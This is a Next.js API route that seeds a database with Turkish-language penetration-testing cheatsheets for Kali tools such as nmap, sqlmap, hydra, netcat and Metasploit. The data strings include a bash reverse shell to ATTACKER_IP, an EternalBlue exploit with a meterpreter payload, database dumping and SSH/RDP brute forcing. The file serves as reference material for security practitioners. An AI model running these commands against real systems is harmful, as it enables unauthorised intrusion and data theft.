import dbConnect from '../../lib/dbConnect'
import Category from '../../models/Category'
import Cheatsheet from '../../models/Cheatsheet'
import fs from 'fs'
import path from 'path'

// Base categories (can be overridden by JSON file)
let categories = [
  { name: 'Network Scanning', description: 'Port ve servis keşfi' },
  { name: 'Web Enumeration', description: 'Web uygulaması keşfi ve taraması' },
  { name: 'Directory Bruteforce', description: 'Dizin ve endpoint keşfi' },
  { name: 'SQL Injection', description: 'SQL enjeksiyon testleri' },
  { name: 'Password Cracking', description: 'Parola kırma ve deneme araçları' },
  { name: 'Network Utilities', description: 'Ağ yardımcı araçları' },
  { name: 'Subdomain Discovery', description: 'Alt alan adı keşfi' },
  { name: 'Wireless', description: 'Kablosuz ağ testleri' },
  { name: 'Exploitation', description: 'Sömürü araçları ve çerçeveler' }
]

// Base sheets (can be overridden by JSON file)
let sheets = [
  {
    title: 'Nmap Cheatsheet',
    category: 'Network Scanning',
    tags: ['nmap', 'scan', 'ports', 'service', 'os', 'nse'],
    links: ['https://nmap.org/book/','https://nmap.org/docs.html'],
    description: `# Nmap Cheatsheet

Temel tarama:

\`\`\`
nmap 192.168.1.10
nmap 192.168.1.0/24
\`\`\`

Port aralığı ve top-ports:

\`\`\`
nmap -p 1-65535 192.168.1.10
nmap --top-ports 1000 192.168.1.10
\`\`\`

Servis/versiyon belirleme ve OS detection:

\`\`\`
nmap -sV 192.168.1.10
nmap -O 192.168.1.10
\`\`\`

Stealth ve hızlı taramalar:

\`\`\`
nmap -sS -T4 192.168.1.10
nmap -sU -T4 192.168.1.10
\`\`\`

NSE scriptleri (vuln örneği):

\`\`\`
nmap --script vuln 192.168.1.10
nmap --script ssl-enum-ciphers -p 443 192.168.1.10
\`\`\`

Çıktı formatları:

\`\`\`
nmap -oN scan.txt -oX scan.xml 192.168.1.10
\`\`\`

Belirli portlar ve exclude:

\`\`\`
nmap -p 22,80,443 192.168.1.10
nmap --exclude 192.168.1.5 192.168.1.0/24
\`\`\`
`
  },
  {
    title: 'Masscan Cheatsheet',
    category: 'Network Scanning',
    tags: ['masscan', 'scan', 'ports', 'performance'],
    links: ['https://github.com/robertdavidgraham/masscan'],
    description: `# Masscan Cheatsheet

Hızlı port taraması:

\`\`\`
masscan 192.168.1.0/24 -p80,443 --rate=10000
\`\`\`

Top ports ve output:

\`\`\`
masscan 10.0.0.0/8 --top-ports 1000 --rate=20000 --output-format json --output-file out.json
\`\`\`
`
  },
  {
    title: 'Gobuster Cheatsheet',
    category: 'Directory Bruteforce',
    tags: ['gobuster', 'dir', 'dns', 'vhost'],
    links: ['https://github.com/OJ/gobuster'],
    description: `# Gobuster Cheatsheet

Dizin brute force:

\`\`\`
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
\`\`\`

DNS modu:

\`\`\`
gobuster dns -d example.com -w subdomains.txt
\`\`\`
`
  },
  {
    title: 'FFUF Cheatsheet',
    category: 'Web Enumeration',
    tags: ['ffuf', 'fuzz', 'web', 'vhost'],
    links: ['https://github.com/ffuf/ffuf'],
    description: `# FFUF Cheatsheet

Basit dizin fuzzing:

\`\`\`
ffuf -u http://target/FUZZ -w /path/to/wordlist.txt -mc 200
\`\`\`

VHost keşfi:

\`\`\`
ffuf -u http://example.com -H 'Host: FUZZ.example.com' -w subdomains.txt -fs 4242
\`\`\`
`
  },
  {
    title: 'Dirsearch Cheatsheet',
    category: 'Directory Bruteforce',
    tags: ['dirsearch', 'dir', 'web'],
    links: ['https://github.com/maurosoria/dirsearch'],
    description: `# Dirsearch Cheatsheet

Temel kullanım:

\`\`\`
dirsearch -u http://target -e php,txt,html -w wordlist.txt -t 50
\`\`\`
`
  },
  {
    title: 'Nikto Cheatsheet',
    category: 'Web Enumeration',
    tags: ['nikto', 'web', 'scan'],
    links: ['https://github.com/sullo/nikto'],
    description: `# Nikto Cheatsheet

Basit tarama:

\`\`\`
nikto -h http://target
\`\`\`

SSL ve port:

\`\`\`
nikto -h https://target -p 443
\`\`\`
`
  },
  {
    title: 'SQLMap Cheatsheet',
    category: 'SQL Injection',
    tags: ['sqlmap', 'sqli', 'db'],
    links: ['https://sqlmap.org/'],
    description: `# SQLMap Cheatsheet

Parametre testi:

\`\`\`
sqlmap -u 'http://target/item.php?id=1' --batch
\`\`\`

DB dump ve tablo seçimi:

\`\`\`
sqlmap -u 'http://target/item.php?id=1' --dbs
sqlmap -u 'http://target/item.php?id=1' -D targetdb --tables
sqlmap -u 'http://target/item.php?id=1' -D targetdb -T users --dump
\`\`\`
`
  },
  {
    title: 'Hydra Cheatsheet',
    category: 'Password Cracking',
    tags: ['hydra', 'bruteforce', 'ssh', 'http'],
    links: ['https://github.com/vanhauser-thc/thc-hydra'],
    description: `# Hydra Cheatsheet

SSH brute force:

\`\`\`
hydra -l root -P passwords.txt ssh://192.168.1.10
\`\`\`

HTTP-Form örneği:

\`\`\`
hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'
\`\`\`
`
  },
  {
    title: 'Netcat Cheatsheet',
    category: 'Network Utilities',
    tags: ['nc', 'netcat', 'port', 'reverse-shell'],
    links: ['http://nc110.sourceforge.net/'],
    description: `# Netcat Cheatsheet

Port dinleme ve bağlantı:

\`\`\`
nc -lvnp 4444
nc 192.168.1.10 4444
\`\`\`

Reverse shell (örnek):

\`\`\`
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
\`\`\`
`
  },
  {
    title: 'Tcpdump Cheatsheet',
    category: 'Network Utilities',
    tags: ['tcpdump', 'pcap', 'filter'],
    links: ['https://www.tcpdump.org/manpages/tcpdump.1.html'],
    description: `# Tcpdump Cheatsheet

Temel capture:

\`\`\`
tcpdump -i eth0
\`\`\`

Filtre örnekleri:

\`\`\`
tcpdump -i eth0 'port 80'
tcpdump -i eth0 'host 192.168.1.10'
tcpdump -i eth0 'net 192.168.1.0/24'
\`\`\`
`
  },
  {
    title: 'Amass Cheatsheet',
    category: 'Subdomain Discovery',
    tags: ['amass', 'dns', 'enum'],
    links: ['https://github.com/owasp-amass/amass'],
    description: `# Amass Cheatsheet

Enum modları:

\`\`\`
amass enum -d example.com
amass enum -brute -d example.com
\`\`\`
`
  },
  {
    title: 'John the Ripper Cheatsheet',
    category: 'Password Cracking',
    tags: ['john', 'hash', 'cracking'],
    links: ['https://www.openwall.com/john/'],
    description: `# John Cheatsheet

Temel kullanım:

\`\`\`
john hashes.txt --format=raw-md5
\`\`\`

Wordlist ve rules:

\`\`\`
john hashes.txt --wordlist=/path/rockyou.txt --rules
\`\`\`
`
  },
  {
    title: 'Hashcat Cheatsheet',
    category: 'Password Cracking',
    tags: ['hashcat', 'gpu', 'cracking'],
    links: ['https://hashcat.net/wiki/'],
    description: `# Hashcat Cheatsheet

Mod seçimi ve temel komut:

\`\`\`
hashcat -m 0 -a 0 hashes.txt /path/rockyou.txt
\`\`\`

Kurallar ve restore:

\`\`\`
hashcat -m 0 -a 0 hashes.txt /path/rockyou.txt -r rules/best64.rule
hashcat --restore
\`\`\`
`
  },
  {
    title: 'Metasploit Cheatsheet',
    category: 'Exploitation',
    tags: ['metasploit', 'msf', 'exploit', 'auxiliary'],
    links: ['https://docs.metasploit.com/'],
    description: `# Metasploit Cheatsheet

Başlangıç:

\`\`\`
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
run
\`\`\`
`
  },
  {
    title: 'WPScan Cheatsheet',
    category: 'Web Enumeration',
    tags: ['wpscan', 'wordpress', 'enum', 'vuln'],
    links: ['https://wpscan.com/', 'https://github.com/wpscanteam/wpscan'],
    description: `# WPScan Cheatsheet

Site ve temel tarama:

\`\`\`
wpscan --url https://target
\`\`\`

Kullanıcı ve eklenti keşfi:

\`\`\`
wpscan --url https://target --enumerate u
wpscan --url https://target --enumerate p
\`\`\`

API token ile zafiyet taraması:

\`\`\`
wpscan --url https://target --api-token <TOKEN>
\`\`\`
`
  },
  {
    title: 'Wfuzz Cheatsheet',
    category: 'Web Enumeration',
    tags: ['wfuzz', 'fuzz', 'web'],
    links: ['https://github.com/xmendez/wfuzz'],
    description: `# Wfuzz Cheatsheet

Basit fuzzing:

\`\`\`
wfuzz -u http://target/FUZZ -w /path/wordlist.txt --hc 404
\`\`\`

Parametre fuzzing:

\`\`\`
wfuzz -u 'http://target/item?id=FUZZ' -w nums.txt --hh 0
\`\`\`
`
  },
  {
    title: 'Sublist3r Cheatsheet',
    category: 'Subdomain Discovery',
    tags: ['sublist3r', 'subdomains'],
    links: ['https://github.com/aboul3la/Sublist3r'],
    description: `# Sublist3r Cheatsheet

Alt alan adı taraması:

\`\`\`
sublist3r -d example.com -o subs.txt
\`\`\`
`
  },
  {
    title: 'TShark Cheatsheet',
    category: 'Network Utilities',
    tags: ['tshark', 'wireshark', 'cli'],
    links: ['https://www.wireshark.org/docs/man-pages/tshark.html'],
    description: `# TShark Cheatsheet

Temel capture ve filtre:

\`\`\`
tshark -i eth0
tshark -i eth0 -f 'port 80'
\`\`\`

Belirli alanları yazdırma:

\`\`\`
tshark -i eth0 -Y 'http.request' -T fields -e http.host -e http.request.uri
\`\`\`
`
  },
  {
    title: 'Aircrack-ng Cheatsheet',
    category: 'Wireless',
    tags: ['aircrack-ng', 'wifi', 'wpa', 'monitor'],
    links: ['https://www.aircrack-ng.org/documentation.html'],
    description: `# Aircrack-ng Cheatsheet

Monitor moda geçiş ve capture:

\`\`\`
airmon-ng start wlan0
airodump-ng wlan0mon
\`\`\`

WPA kırma (örnek):

\`\`\`
aircrack-ng -w wordlist.txt -b <BSSID> capture.cap
\`\`\`
`
  },
  {
    title: 'Ncrack Cheatsheet',
    category: 'Password Cracking',
    tags: ['ncrack', 'bruteforce', 'network'],
    links: ['https://nmap.org/ncrack/'],
    description: `# Ncrack Cheatsheet

SSH ve RDP brute force örneği:

\`\`\`
ncrack -v -u admin -P passwords.txt ssh://192.168.1.10,rdp://192.168.1.20
\`\`\`
`
  },
  {
    title: 'Burp Suite Cheatsheet',
    category: 'Web Enumeration',
    tags: ['burp', 'proxy', 'intruder', 'repeater'],
    links: ['https://portswigger.net/burp/documentation'],
    description: `# Burp Suite Cheatsheet

Proxy ayarı ve temel akış:

\`\`\`
Tarayıcıyı proxy 127.0.0.1:8080 olacak şekilde ayarlayın.
Burp > Proxy > Intercept: ON/OFF
\`\`\`

Intruder ve Repeater kullanımı için kısa notlar:

\`\`\`
Target > Site map
Right click > Send to Repeater/Intruder
\`\`\`
`
  },
  {
    title: 'OWASP ZAP Cheatsheet',
    category: 'Web Enumeration',
    tags: ['zap', 'proxy', 'active scan'],
    links: ['https://www.zaproxy.org/docs/'],
    description: `# ZAP Cheatsheet

Hızlı başlat:

\`\`\`
zaproxy -daemon -config api.key=<KEY>
\`\`\`

Aktif tarama:

\`\`\`
ZAP UI > Quick Start > Automated Scan
\`\`\`
`
  },
  {
    title: 'theHarvester Cheatsheet',
    category: 'Web Enumeration',
    tags: ['theharvester', 'osint', 'emails', 'hosts'],
    links: ['https://github.com/laramies/theHarvester'],
    description: `# theHarvester Cheatsheet

E-posta ve host toplama:

\`\`\`
theHarvester -d example.com -b google,bing -l 200 -f out.html
\`\`\`
`
  },
  {
    title: 'dnsenum Cheatsheet',
    category: 'Subdomain Discovery',
    tags: ['dnsenum', 'dns', 'enum'],
    links: ['https://github.com/fwaeytens/dnsenum'],
    description: `# dnsenum Cheatsheet

Temel kullanım:

\`\`\`
dnsenum example.com
\`\`\`
`
  },
  {
    title: 'recon-ng Cheatsheet',
    category: 'Web Enumeration',
    tags: ['recon-ng', 'framework', 'osint'],
    links: ['https://github.com/lanmaster53/recon-ng'],
    description: `# recon-ng Cheatsheet

Modüller ve workspace:

\`\`\`
recon-ng
workspaces add target
modules search
\`\`\`
`
  },
  {
    title: 'WhatWeb Cheatsheet',
    category: 'Web Enumeration',
    tags: ['whatweb', 'fingerprint'],
    links: ['https://github.com/urbanadventurer/WhatWeb'],
    description: `# WhatWeb Cheatsheet

Tek hedef ve agresif mod:

\`\`\`
whatweb http://target -a 3
\`\`\`
`
  },
  {
    title: 'WAFW00F Cheatsheet',
    category: 'Web Enumeration',
    tags: ['wafw00f', 'waf', 'fingerprint'],
    links: ['https://github.com/EnableSecurity/wafw00f'],
    description: `# WAFW00F Cheatsheet

WAF tanımlama:

\`\`\`
wafw00f http://target
\`\`\`
`
  },
  {
    title: 'amap Cheatsheet',
    category: 'Network Scanning',
    tags: ['amap', 'service-detection'],
    links: ['https://github.com/vanhauser-thc/amap'],
    description: `# amap Cheatsheet

Servis tespiti:

\`\`\`
amap -b 192.168.1.10 1-1024
\`\`\`
`
  }
]

export default async function handler(req, res) {
  // Optional JSON override per-request
  try {
    const jsonPath = path.join(process.cwd(), 'data', 'kali-tools.json')
    if (fs.existsSync(jsonPath)) {
      const dataRaw = fs.readFileSync(jsonPath, 'utf-8')
      const data = JSON.parse(dataRaw)
      if (Array.isArray(data.categories) && data.categories.length) {
        categories = data.categories
      }
      if (Array.isArray(data.sheets) && data.sheets.length) {
        sheets = data.sheets
      }
    }
  } catch (e) {
    console.warn('Seed API: JSON dataset not loaded:', e.message)
  }
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const secret = req.query.secret || req.headers['x-seed-secret']
  if (!process.env.SEED_SECRET) {
    return res.status(400).json({ error: 'Missing SEED_SECRET env variable' })
  }
  if (!secret || secret !== process.env.SEED_SECRET) {
    return res.status(401).json({ error: 'Unauthorized: invalid seed secret' })
  }

  try {
    await dbConnect()

    // Upsert categories and keep a map for reference
    const catMap = {}
    for (const cat of categories) {
      let c = await Category.findOne({ name: cat.name })
      if (!c) {
        c = await Category.create(cat)
      } else {
        c.description = cat.description
        await c.save()
      }
      catMap[cat.name] = c._id
    }

    // Upsert cheatsheets
    let created = 0
    for (const s of sheets) {
      const categoryId = catMap[s.category]
      if (!categoryId) continue
      const existing = await Cheatsheet.findOne({ title: s.title })
      if (existing) {
        existing.description = s.description
        existing.tags = s.tags
        existing.links = s.links
        existing.category = categoryId
        await existing.save()
      } else {
        await Cheatsheet.create({
          title: s.title,
          description: s.description,
          tags: s.tags,
          links: s.links,
          category: categoryId
        })
        created++
      }
    }

    return res.status(200).json({ message: 'Seed completed', categories: Object.keys(catMap).length, created })
  } catch (err) {
    console.error('Seed error:', err)
    return res.status(500).json({ error: err.message || 'Seed failed' })
  }
}